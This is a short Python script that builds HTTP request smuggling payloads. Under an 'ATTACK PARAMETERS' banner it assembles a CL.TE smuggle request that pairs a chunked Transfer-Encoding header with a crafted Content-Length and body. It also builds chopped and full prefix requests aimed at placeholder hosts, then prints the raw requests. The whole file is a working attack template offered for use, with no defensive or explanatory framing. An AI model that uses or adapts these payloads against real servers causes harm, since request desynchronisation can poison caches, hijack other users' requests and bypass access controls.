# --------------------------- #
# ----ATTACK PARAMETERS!----- #
# --------------------------- #

# -- Smuggle Request Parameters
SmuggleGadget         = "Transfer-Encoding: chunked"
TheVerb               = "POST"
TheEP                 = "/"
TheProtocol           = "HTTP/1.1"
TheHost               = "https://private.com"
# --

# -- Prefix Request Parameters
PrefixVerb            = "GET"
PrefixEP              = "/404"
PrefixProtocol        = "HTTP/1.1"
PrefixHost            = "<example>.com"
Chopped               = True
ChoppedHost           = False
# --


# ------------------------------------------------- #
# If you make changes to the headers formats below
# try not to break the parameterization.
# ------------------------------------------------- #

RN = "\r\n"

# --------------------------- #
# --CHOPPED PREFIX REQUEST!-- #
# --------------------------- #
prefix_chopped  = ("%s %s HTTP/1.1" % (PrefixVerb, PrefixEP)) + RN
if (ChoppedHost): prefix_chopped += ("Host: %s" % (PrefixHost)) + RN
prefix_chopped += "X: X" # CHOP!
# --------------------------- #

# --------------------------- #
# ----FULL PREFIX REQUEST!--- #
# --------------------------- #
prefix_full  = ("%s %s %s" % (PrefixVerb, PrefixEP, PrefixProtocol)) + RN
prefix_full += ("Host: %s" % (PrefixHost)) + RN
prefix_full += "Connection: keep-alive" + RN
prefix_full += "Accept-Encoding: gzip, deflate" + RN
prefix_full += "Accept: */*" + RN
prefix_full += "Accept-Language: en" + RN
prefix_full += "Content-Type: application/x-www-form-urlencoded" + RN
prefix_full += RN
# --------------------------- #

# --------------------------- #
# ---CLTE SMUGGLE REQUEST!--- #
# --------------------------- #

# -- smuggle request body starts here --
smuggle_body = "3" + RN
smuggle_body += "x=y" + RN
smuggle_body += "0"
smuggle_body += RN
smuggle_body += RN

content_length = len(smuggle_body)

# -- smuggle headers starts here --

smuggle  = ("%s %s %s" % (TheVerb, TheEP, TheProtocol)) + RN
smuggle += SmuggleGadget + RN                    # SMUGGLE GADGET!
smuggle += ("Host: %s" % (TheHost)) + RN
smuggle += "Content-Length: " + str(content_length) + RN
smuggle += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" + RN
smuggle += "Origin: https://www.google.com" + RN 
smuggle += "Accept-Encoding: gzip, deflate" + RN
smuggle += "Content-Type: application/x-www-form-urlencoded" + RN
smuggle += RN
#merge the headers with the body request
smuggle += smuggle_body

# --------------------------- #

# --------------------------- #
# -----REGULAR REQUEST!------ #
# --------------------------- #
regular  = "GET / HTTP/1.1" + RN
regular += ("Host: %s" % (TheHost)) + RN
regular += "Origin: https://www.google.com" + RN
regular += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36" + RN
regular += RN


print(smuggle)
print(regular)
